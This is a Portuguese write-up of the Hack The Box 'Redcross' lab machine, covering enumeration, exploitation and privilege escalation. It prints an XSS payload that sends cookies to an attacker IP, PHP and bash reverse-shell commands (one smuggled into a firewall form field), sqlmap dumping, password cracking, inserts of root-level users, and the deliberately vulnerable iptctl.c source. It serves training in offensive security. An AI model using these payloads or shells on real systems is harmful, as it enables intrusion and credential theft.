---
title: "Hack The Box - Redcross"
tags: [Linux,Medium,Gobuster,XSS,PayloadAllTheThings,SQLInjection,BurpSuite,Brute Force,Metasploit,Buffer Overflow Linux]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/155>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta (Não vou rodar essa flag pq teve uma saída bem bizarra)

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 - Servidor SSH

> Portas 80 e 443 - Servidor Web

## Enumeração da Portas 80 e 443

Por se tratar de um servidor web, a primeira coisa que fazemos é acessar ele pelo navegador

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web.png)

Ao entramos no site 10.10.10.113, percebemos que ele redireciona automaticamente para `http://intra.redcross.htb/`, então vamos adicionar esse dominio no nosso /etc/hosts pra ver se conseguimos algo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_hosts.png)

Ao entramos na página agora, temos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web1.png)

Interessante... vamos prosseguir na enumeração de outras portas antes de voltar aqui e explorar mais

Interessante que ele nos encaminha diretamente para o endereço https, vamos verificar no Certificado, pra ver se encontramos alguma coisa (sempre é bom fazer isso quando nos deparamos com sites https)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web2.png)

Opa encontramos o e-mail de um possível usuário para essa máquina - `E = penelope@redcross.htb`

### Gobuster

Vamos então rodar um gobuster na página, pra ver se encontramos algo de útil. Colocamos o `-x php` pois a página pelo que parece, é feita em PHP, então vai que encontramos algo interessante

`gobuster dir -u https://intra.redcross.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -k -t 40`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_gobuster.png)

Explicação parâmetros Gobuster

> -k --> ignora SSL

> dir -u --> url

> -w --> wordlist

> -x php --> pesquisa por php também

> -t 40 --> aumenta as threads, pra ir mais rápido

Uma das unicas coisa que nos interessou foi o /documentation, então acessamos a página pra ver

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web4.png)

Bom, deu erro 403 Forbidden, mas vamos rodar outro Gobuster dentro dela, pq vai que tem documentos ai dentro, dessa vez vou passa outros parâmetros pro `-x`, vou passar `pdf`, pq vai que temos arquivos pdf dentro (pelo nome da pasta é bem possível)

`gobuster dir -u https://intra.redcross.htb/documentation/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x pdf -k -t 40`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_gobuster1.png)

Bom, encontramos um arquivo que nos pareceu interessante ai dentro! `/account-signup.pdf`

Vamos ver do que se trata `https://intra.redcross.htb/documentation/account-signup.pdf`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web5.png)

Interessante, fala sobre um campo de "Ajuda" acessando ele, temos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web6.png)

Percebemos que o servidor espera algum tipo de interação... o que é interessante, mas vamos prosseguir na enumeração antes de explorar isso

### VHOST Fuzzing

Vamos fazer um fuzzing nos VHOSTS, uma vez que encontramos o intra.redcross.htb, pode ser que tenha mais

> wfuzz -t 200 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.redcross.htb" --hw 28 https://10.10.10.113/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_wfuzz.png)

#### admin.redcross.htb

Verificamos do que se trata esse admin.redcross.htb então que foi encontrado agora, adicionamos ele no /etc/hosts e acessamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_hosts1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web3.png)

# Explorando a Máquina

O "passo-a-passo" de como explorar essa máquina, é um mix dos procedimentos adotados pelo `Ippsec`, do `0xdf` e do `Ech0`, que peguei em seus respectivos blogs/videos, todas a imagens e ideias vieram deles, pouca coisa eu desenvolvi por mim mesmo. Achei muito interessante essa mistura de conceitos/procedimentos que fiz entre eles, é de grande valia para o conhecimento.

Essa máquina é muito interessante e temos diversas maneiras de explorar ela por diferentes caminhos...

Esse fluxograma do `0xdf` explica bem o que será realizado e quais caminhos temos para fazer as coisas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_chart.png)

Então vamos iniciar

## Ganhando acesso ao admin.redcross.htb

Primeira coisa para se explorar é ganharmos acesso ao painel de admin do redcross, novamente vou mostrar o fluxograma do `0xdf`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_char1.png)

Então a ideia é essa, vamos fazer os dois caminhos...

### 1º Caminho - XSS (Cross-Site-Scripting)

Antes de simplesmente explorarmos essa vulnerabilidade vamos tentar explicar um pouco do que se trata

```
Através de um XSS, o hacker injeta códigos JavaScript em um campo texto de uma página já existente e este JavaScript é apresentado para outros usuários, porque persiste na página.

Exemplo de ataque: Imaginem que o hacker insira, em um fórum de um website alvo de ataque, um texto que contenha um trecho de JavaScript. Este JavaScript poderia, por exemplo, simular a página de login do site, capturar os valores digitados e enviá-los a um site que os armazene.

Quando o texto do fórum for apresentado a outros usuários, um site atacado pelo XSS exibirá o trecho de JavaScript digitado anteriormente nos browsers de todos os outros usuários,

Por fim, o atacante recebe a resposta em seu browser = ACK 
```

Um repositório do GitHub que mostra muito bem, explica com exemplos de payloads já prontos é este (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web8.png)

A ideia geral é essa, eu consigo inserir códigos dentro de formulários, e é isso que vamos fazer. A página que está vulnerável é a `https://intra.redcross.htb/?page=contact`

Então acessamos ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web7.png)

O payload que iremos utilizar para PoC (ver se está realmente vulnerável) é este

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web9.png)

`<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>`

Adaptamos para nossa máquina

`<script>new Image().src="http://10.10.16.4/cookie.php?c="+document.cookie;</script>`

O campo vulnerável é o último campo, caso tentamos fazer o ataque nos outros campos o resultado é esse

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web10.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web11.png)

Então agora vamos fazer no campo certo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web13.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web14.png)

E recebemos no terminal

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web12.png)

`PHPSESSID=414oqpjp8lbuj1dm5v4mahtrm5`

Trocamos no site o PHPSESSID e viramos admin na página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web15.png)

### 2º Caminho - Cookie do login (SQLInjection)

O outro modo que temos para conseguir acesso de administrador no painel é através da criação de um usuário comum e a partir disso identificar o ponto de sqlinjection em um campo e extrair as informações

Então vamos lá, primeiro vamos seguir os passos que estavam no PDF para criação de um usuário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web16.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web17.png)

Agora logamos como guest:guest

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web18.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web19.png)

#### Identificando SQLI

Olhando na página, temos um campo ID onde podemos inserir algo ali, por exemplo, se inserimos `ID=1` temos uma mensagem do admin...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web20.png)

O que aconteceria se mandassemos um `'`?

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web21.png)

Opa! Temos mensagem de erro, então possivelmente temos um ponto de SQLInjection aqui!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web22.png)

Vamos mandar para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web23.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web24.png)

Salvamos como um arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web25.png)

Então vamos passar essa requisição para o `sqlmap` e tentar extrair informações!

`sqlmap -r admin.req --batch --dbms mysql --force-ssl -p o --dump`

Explicação parâmetros sqlmap

> -r --> qual arquivo da requisição

> --batch --> vai pegar a resposta padrão das perguntas Y/N

> --dbms mysql --> já indiquei que o banco de dados é mysql, pra agilizar

> --force-ssl --> vai forçar conexão SSL, pois o site é na porta 443

> -p o --> indiquei qual que é o parâmetro vulnerável, no caso é o o

> --dump --> vai fazer o dump do banco de dados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web26.png)

Isso demora muito tempo, é bem lento, mas me da as informações que eu preciso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web27.png)

```
admin:$2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq.
penelope:$2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS
charles:$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i
tricia:$2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. 
guest:$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi
```

Então vamos quebrar essas senhas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web28.png)

`john hashes --wordlist=/usr/share/wordlists/rockyou.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web29.png)

O usuário charles tem a senha `cookiemonster`

O usuário penelope tema senha `alexss`

#### Acessando como charles

Uma vez que possuimos as credenciais do usuário charles, vamos acessar o painel pelo login dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web30.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web31.png)

Recebemos essa mensagem de erro. Agora se formos no `intra.redcross.htb` e logarmos como charles

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web32.png)

Conseguimos logar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web33.png)

Agora se pegamos o cookie do charles, com F12

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web34.png)

`lc01q7bf304shdfcq4dupjvq85`

E setamos ele no PHPSESSID

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web35.png)

Conseguimos acesso!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_web36.png)

## Shell de Penelope

Bom, agora que conseguimos o acesso ao painel de administrador do servidor, vamos passar pro próximo passo que é conseguir um shell do usuário `penélope` na máquina, novamente há mais de um caminho para se fazer isso, e vou colocar o fluxograma do `0xdf` para ficar de melhor vizualização

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_cart2.png)

### Burlando o Firewall

Bom, pra todas as opções nós devemos burlar o firewall pra ter sucesso, então vamos fazer isso

Clicamos em `Network Access`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_fir1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_fir.png)

Agora digito o IP da minha Kali e clico em `Allow IP`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_fir2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_fir3.png)

Agora rodo o nmap de novo na máquina, e vejo que abriram outras portas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_fir4.png)

### 1º Modo - Haraka

Bom, para "identificar" que é vulnerável precisamos de mais umas enumerações dentro da porta 1025, com uma conexão simples no nc na porta já conseguimos verificar o Haraka sendo executado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_har.png)

Então, procuramos por exploits e copiamos para nossa pasta de trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_har1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_har2.png)

Verificamos como ele funciona

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_har4.png)

Precisamos fazer uns ajustes no exploit, na linha 123, ele está se conectando com a porta 25, mas o servidor está sendo executado na 1025

Antes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_har5.png)

Depois

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_har6.png)

Então fazemos a máquina nos pingar

`python 41162.py -c "ping -c 1 10.10.16.4" -t penelope@redcross.htb -m 10.10.10.113`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_har3.png)

Shoow! Deu certo, agora vamos pegar um reverse shell (esse reverse deu muito trabalho por causa das " e dos $)

`python 41162.py -c "php -r '\$sock=fsockopen(\"10.10.16.4\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -t penelope@redcross.htb -m 10.10.10.113`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_har7.png)

Beleza, conseguimos, também poderíamos ter feito através do metasploit framework

### 2º Modo - Haraka - Metasploit Framework

Setamos as configurações no módulo (linux/smtp/haraka)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_met.png)

Executamos e ganhamos um shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_met1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_met2.png)

### 3º Modo - Shell como www-data

Outro método de conseguirmos shell na máquina é de www-data, vamos lá. Tendo uma vez habilitado nosso ip no Firewall, clicamos na outra aba do site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www1.png)

Adiciono um novo usuário qualquer, no caso eu vou adicionar o user shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www2.png)

shell : n1VcQXC8

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www4.png)

Agora nos conectamos no pelo SSH com a máquina, com as credenciais dadas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www5.png)

Bom estamos claramente em um container... não temos muito oq fazer aqui, não podemos executar muitos comandos, a única coisa interessante que encontramos foi o fato de ter um arquivo .c na pasta /home/public/src/, depois vamos explorar ele para ganhar acesso de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www6.png)

Bom, aqui estamos travados, não temos muito para onde ir... Verificando aquele Firewall dele, ele executa como se fossem comandos antes de liberar o IP ali aparece, adicionando iptables e tals... será que não conseguimos explorar por ai?

Então acessamos a página novaemnte e mandamos ela pro BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www7.png)

Mandamos para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www8.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www10.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www9.png)

Agora começamos a interação... A minha ideia de Payload é que está sendo executado como se fosse `COMANDO 8.8.8.8`, seguindo essa ideia, se adicionarmos um ; após o final do IP, se for shell, o outro comando será executado... vamos testar

Bem não deu certo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www11.png)

Agora se testamos com deny... Dá certo (isso é com teste pra descobrir, não sei como posso fazer pra explicar isso)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www12.png)

Bom, agora pegamos um reverse shell `;bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'` (Lembrar de encodar pra URL)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www13.png)

Show, temos shell de www-data na máquina

Bom, agora vamos "escalar" pra penélope. Para isso pesquisamos credenciais nos arquivos de configuração da página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www14.png)

Encontramos as credenciais do banco de dados, muito bom! A que me interessa é essa, uma vez que pode adicionar usuários

`$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");`

Então nos conectamos ao banco de dados para ver se encontramos algo

`psql -h 127.0.0.1 -U unixusrmgr unix`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www15.png)

Com o comando `\d` listamos todas as tabelas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www16.png)

Agora listamos essa `passwd_table` que nos chamou atenção

`select * from passwd_table;`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www17.png)

```
tricia:$1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp.
shell:$1$krnWjnxC$ZvyaOP94ZY8Cwc0chBs8h/ 
```

Bom sabendo que esse usuário pode adicionar usuários, vamos criar um e adicionar nessa tabela

`openssl passwd -1 teste`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www18.png)

Agora adicionamos esse usuário

`insert into passwd_table (username, passwd, gid, homedir) values ('teste', '$1$gFlFdvYZ$GLMwhyZxxPBiTianGcbdX1', 0, '/');`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www19.png)

Agora verificamos se realmente foi adicionado

`select * from passwd_table;`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www20.png)

Agora tentamos acesso SSH e tentamos ler a flag, mas não conseguimos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www21.png)

Pq não deu? Pq o ID dele não bate com o da penelope. Então vamos verificar qual é o ID dela no `/etc/passwd`

`grep penelope /etc/passwd`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www22.png)

Bom, agora vamos criar outro usuário chamado teste1, com a mesma senha, só com o ID 1000 ao invés de 0 e o home dele como sendo o da penelope

`insert into passwd_table (username, passwd, gid, homedir) values ('teste1', '$1$gFlFdvYZ$GLMwhyZxxPBiTianGcbdX1', 1000, '/home/penelope');`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www23.png)

Verificamos se foi criado

`select * from passwd_table;`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www24.png)

Nos conectamos via ssh e verificamos que agora deu certo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_www25.png)

Bom, agora já chega, vamos iniciar os passos para escalação de privilégio para root

# Escalando Privilégio (Penélope - Root)

A escalação de privilégio nessa máquina é bem bacana também, todos eles derivam do shell da Penélope, novamnte vou colocar o fluxograma do 0xdf, explicando quais são os caminhos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_flux.png)

## 1º Modo - Grupo Sudoers

Primeira maneira de se escalar privilégio nessa máquina é a partir da criação de um usuário no grupo do sudoers, o grupo sudoers tem por padrão o ID número 27, então se criamos um usuáriom com GID 27, ele estará no sudoers, e eu vou ter acesso de root na máquina.

Vamos confirmar se realmente é o grupo 27 o do sudoers

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_sudo.png)

Sim, realmente é ele... Então agora adicionamos no painel do psql o usuário `teste` com o GID de sudo

`insert into passwd_table (username, passwd, gid, homedir) values ('teste', '$1$gFlFdvYZ$GLMwhyZxxPBiTianGcbdX1', 27, '/home/penelope');`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_sudo1.png)

Verificamos se foi criado

`select * from passwd_table;`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_sudo2.png)

Sim, foi criado!

Agora nos conectamos via SSH

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_sudo3.png)

Damos `sudo su` e viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_sudo4.png)

Podemos até ler a flag, vou apenas dar um `wc -l` nela pra não mostrar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_sudo5.png)

Pronto, vamos para outro método agora

## 2º Modo - Através do unixssroot

Aqui é um pouco diferente, vou criar um usuário `teste1` com o id do root, que é 0

`insert into passwd_table (username, passwd, gid, homedir) values ('teste1', '$1$gFlFdvYZ$GLMwhyZxxPBiTianGcbdX1', 0, '/root');`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_unix.png)

Verificamos se foi criado

`select * from passwd_table;`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_unix1.png)

Sim, foi criado!

Agora nos conectamos via SSH

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_unix2.png)

Tentamos ler a flag, e vemos que não é possível, mesmo sendo "root"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_unix3.png)

Qual o problema?

### Verificando configuração psql

O problema aqui é que caimos em uma espécie de jail, baseada em algo chamado Name Service Switch, o que habilita vc a guardar informações de grupos e usuários em um banco de dados. PostgreSQL tem um plugin muito bom para isso, refência é o blog do 0xdf e este link (http://www.karoltomala.com/blog/?p=869)

Verificando o artigo, descobrimos que temos dois arquivos de configuração que definem como será a query da database, o `nss-pgsql.conf` e o `nss-psql-root.conf`, podemos ver os dois na máquina

`ls -l nss-pgsql*`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_pg.png)

Verificamos qual é o conteúdo do nss-pgsql-root.conf

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_pg1.png)

Bom, agora vamos nos conectar ao banco de dados com a senha de root

### Criando usuário "root"

Entramos no banco de dados

> psql -h 127.0.0.1 -U unixnssroot -p 5432 -d unix

Senha: 30jdsklj4d_3

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_pg2.png)

Adicionamos novo usuário `teste2`

> insert into passwd_table (username, passwd, uid, gid, homedir) values ('teste2', '$1$gFlFdvYZ$GLMwhyZxxPBiTianGcbdX1', 0, 0, '/root');

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_pg3.png)

Verificamos se foi adicionado

> select * from passwd_table;

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_pg4.png)

Agora com o comando `su teste2` nos tormanos o usuário com os privilégios de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_pg5.png)

Conseguimos ler a flag!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_pg6.png)

Bom, agora vamos para o último modo, e creio eu o mais difícil pra mim, que é o Buffer Overflow da aplicação `iptctl`

## 3º Modo - Buffer Overflow Iptctl

Verificando no shell do www-data, vemos que temos o binário `iptctl` que tem suid habilitado, o que nos chamou atenção, logicamente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof.png)

Passamos ele para nossa Kali, pra ver como pode explorar ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof1.png)

Bom, faz sentido ter o setuid habilitado, uma vez que somente o root pode mexer nas regras de firewall da máquina, e eu sei que esse binário é chamado pela aplicação php que não está sendo executada como root

### Analisando o código fonte do binário

Mas vamos analisar esse binário agora. Lembrando que também temos o código fonte dele, o `iptctl.c` que possívelmente foi compilado e se tornou o binário.

O código dele está em `/home/public/src/iptctl.c` isso quando entramos com o SSH que criamos no IT Admin Panel

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof4.png)

`shell:fppg0GX5`

Logamos no ssh com as credenciais criadas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof6.png)

Verificamos o `iptctl.c`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-redcross/R_bof5.png)

Aqui está ele

iptctl.c
```
/*
 * Small utility to manage iptables, easily executable from admin.redcross.htb
 * v0.1 - allow and restrict mode
 * v0.3 - added check method and interactive mode (still testing!)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#define BUFFSIZE 360

int isValidIpAddress(char *ipAddress)
{
        struct sockaddr_in sa;
        int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
        return result != 0;
}

int isValidAction(char *action){
        int a=0;
        char value[10];
        strncpy(value,action,9);
        if(strstr(value,"allow")) a=1;
        if(strstr(value,"restrict")) a=2;
        if(strstr(value,"show")) a=3;
        return a;
}

void cmdAR(char **a, char *action, char *ip){
        a[0]="/sbin/iptables";
        a[1]=action;
        a[2]="INPUT";
        a[3]="-p";
        a[4]="all";
        a[5]="-s";
        a[6]=ip;
        a[7]="-j";
        a[8]="ACCEPT";
        a[9]=NULL;
        return;
}

void cmdShow(char **a){
        a[0]="/sbin/iptables" ;
        a[1]="-L";
        a[2]="INPUT";
        return;
}

void interactive(char *ip, char *action, char *name){
        char inputAddress[16];
        char inputAction[10];
        printf("Entering interactive mode\n");
        printf("Action(allow|restrict|show): ");
        fgets(inputAction,BUFFSIZE,stdin);
        fflush(stdin);
        printf("IP address: ");
        fgets(inputAddress,BUFFSIZE,stdin);
        fflush(stdin);
        inputAddress[strlen(inputAddress)-1] = 0;
        if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
                printf("Usage: %s allow|restrict|show IP\n", name);
                exit(0);
        }
        strcpy(ip, inputAddress);
        strcpy(action, inputAction);
        return;
}

int main(int argc, char *argv[]){
        int isAction=0;
        int isIPAddr=0;
